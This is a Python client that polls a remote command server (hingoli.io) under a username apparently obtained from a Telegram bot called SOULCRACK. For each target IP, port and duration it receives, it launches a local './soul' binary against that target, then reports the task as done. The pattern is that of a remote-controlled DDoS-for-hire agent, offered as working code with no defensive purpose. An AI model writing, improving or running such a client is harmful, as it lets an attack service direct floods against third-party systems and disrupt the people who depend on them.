import requests
import subprocess
import time
import json

BASE_URL = 'https://hingoli.io/soul/soul.php'
DONE_PATH = '/done'
User_name = '59394712677452' #add here real username get from my api bot so you need that to get username get from @SOULCRACK
active_tasks = {}

def process_new_task(connection):
    ip = connection.get('ip')
    port = connection.get('port')
    time_val = connection.get('time')

    if ip and port and time_val:
        key = (ip, str(port), str(time_val))
        if key not in active_tasks:
            print(f"[+] New task added: IP={ip}, Port={port}, Time={time_val}")
            try:
                process = subprocess.Popen(['./soul', ip, str(port), str(time_val)])
                print(f"[+] Launched binary: ./soul {ip} {port} {time_val} (PID: {process.pid})")
                active_tasks[key] = {
                    'process': process,
                    'remaining_time': int(time_val),
                    'original_time': int(time_val)
                }
            except Exception as e:
                print(f"[!] Failed to launch binary: {e}")
        else:
            print(f"[*] Task already active: IP={ip}, Port={port}, Time={time_val}")
    else:
        print("[!] Task received but missing ip, port, or time values")

def main_loop():
    headers = {
        'User-Agent': 'TG-SOULCRACK'
    }
    
    while True:
        try:
            
            response = requests.get(f'{BASE_URL}/{User_name}', headers=headers, timeout=10)
            response.raise_for_status()
            
            # Debug output
            print(f"[DEBUG] Status: {response.status_code}")
            print(f"[DEBUG] Content: {response.text[:200]}...")
            
            if not response.text.strip():
                print("[!] Empty response received")
                time.sleep(1)
                continue
            
            try:
                data = response.json()
            except json.JSONDecodeError as je:
                print(f"[!] JSON decode error: {je}")
                time.sleep(1)
                continue

            # FIX: Handle the actual response structure - direct array of connections
            if isinstance(data, list):
                print(f"[+] Received {len(data)} active connections")
                for connection in data:
                    if isinstance(connection, dict):
                        process_new_task(connection)
                    else:
                        print(f"[!] Invalid connection format: {connection}")
            else:
                print(f"[!] Unexpected data structure: {type(data)} - {data}")

          
            tasks_to_delete = []
            for key, task_info in list(active_tasks.items()):
                ip, port, orig_time = key
                task_info['remaining_time'] -= 1
                
                print(f"[*] Task: {ip}:{port} - {task_info['remaining_time']}/{task_info['original_time']}s remaining")
                
                if task_info['remaining_time'] <= 0:
                    print(f"[+] Time expired for task: IP={ip}, Port={port}")
                    try:
                
                        done_url = f"{BASE_URL}/{User_name}{DONE_PATH}"
                        del_resp = requests.get(done_url,
                                              params={'ip': ip, 'port': port, 'time': orig_time},
                                              headers=headers, timeout=10)
                        
                        if del_resp.status_code == 200:
                            print(f"[+] Successfully completed task: IP={ip}, Port={port}")
                        else:
                            print(f"[!] Delete request failed with status: {del_resp.status_code}")
                    except Exception as e:
                        print(f"[!] Failed to send delete request: {e}")
                    
                    # Terminate the process if it's still running
                    try:
                        task_info['process'].terminate()
                        task_info['process'].wait(timeout=5)
                    except:
                        try:
                            task_info['process'].kill()
                        except:
                            pass
                    
                    tasks_to_delete.append(key)

            # Remove completed tasks
            for key in tasks_to_delete:
                active_tasks.pop(key, None)

            time.sleep(1)
            
        except requests.RequestException as e:
            print(f"[!] Request error: {e}")
            time.sleep(5)  # Longer delay on connection errors
        except Exception as e:
            print(f"[!] General error: {e}")
            time.sleep(1)

if __name__ == '__main__':
    print("[+] Starting SOULCRACK client...")
    print(f"[+] Monitoring: {BASE_URL}/{User_name}")
    main_loop()
